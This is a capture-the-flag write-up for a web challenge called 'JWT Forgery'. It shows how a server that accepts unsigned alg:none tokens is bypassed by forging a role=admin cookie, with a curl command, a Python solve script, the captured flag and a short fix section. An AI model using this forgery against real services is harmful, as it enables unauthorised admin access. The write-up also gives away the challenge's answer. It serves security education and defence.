---
title: "JWT Forgery"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: easy
points: 150
flag_format: "safctf{...}"
author: "Strawhats"
---

# JWT Forgery

> **Category:** WEB · **Points:** 150 · **Difficulty:** easy

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- **Target:** http://54.72.82.22:8100

## Observations

`GET /` sets a session cookie that is a JWT:

```
set-cookie: auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImJvYiIsInJvbGUiOiJ1c2VyIn0.
```

Decoded:

```json
{"alg":"none","typ":"JWT"}          // header
{"username":"bob","role":"user"}    // payload
                                     // signature: empty
```

The server already ships `alg:none` tokens with no signature. `/admin` returns
`{"error":"not admin"}`, and `GET /` echoes back the `role` it read from the
token — so authorization is driven purely by an unverified payload field.

## Exploit

Re-encode the payload with `"role":"admin"`, keep `alg:none`, leave the
signature segment empty:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImJvYiIsInJvbGUiOiJhZG1pbiJ9.
```

```
curl -H 'Cookie: auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImJvYiIsInJvbGUiOiJhZG1pbiJ9.' \
     http://54.72.82.22:8100/admin
```

Response:

```json
{"message":"Welcome, admin!","flag":"safctf{1e4d7bdea93b47c2a813ea5a89f20870}"}
```

## Notes

The `alg` check is case-insensitive-blind — `none`, `None`, `NONE`, `nOnE` all
pass, and a literal `none` signature string works too. Any of them returns the
same welcome-admin response with the flag, so the forgery is robust to
normalization the server might do on the algorithm name.

## Root cause / fix

The verifier accepts `alg:none` (RFC 7519 marks it optional and unsafe) and
never checks the signature. Fix: pin the expected algorithm server-side
(`algorithms=["HS256"]`) and reject `none` outright; never read `role` from a
token you did not verify.

## Reproduction

```sh
.venv/bin/python chal/web/jwt-forgery/solve.py
```

## Solve script

`web/jwt-forgery/solve.py`:

```python
#!/usr/bin/env python3
"""JWT Forgery — safctf

The server issues a token already signed with alg:none and trusts `role` from
the payload without verifying a signature. Re-sign the payload with role=admin
and an empty signature.

    python3 solve.py
"""
import base64
import json
import urllib.error
import urllib.request

TARGET = "http://54.72.82.22:8100"


def b64(d: dict) -> str:
    return base64.urlsafe_b64encode(
        json.dumps(d, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()


def forge(role: str = "admin", username: str = "bob") -> str:
    header = b64({"alg": "none", "typ": "JWT"})
    payload = b64({"username": username, "role": role})
    return f"{header}.{payload}."  # empty signature


def main() -> None:
    token = forge()
    print(f"forged token: {token}")
    req = urllib.request.Request(
        f"{TARGET}/admin", headers={"Cookie": f"auth={token}"}
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            print(r.read().decode())
    except urllib.error.HTTPError as e:
        print(f"HTTP {e.code}: {e.read().decode(errors='replace')}")


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- `base64`
- Python `urllib` (stdlib HTTP client)
- Python 3 (solver)
- curl

**Other tools that fit this category:**

- Burp Suite / mitmproxy (intercept + repeat)
- ffuf / feroxbuster (content & parameter discovery)
- sqlmap (automated SQLi)
- tplmap (SSTI)
- jwt_tool (JWT attacks)
- nikto
- nuclei

## Flag

```
safctf{1e4d7bdea93b47c2a813ea5a89f20870}
```
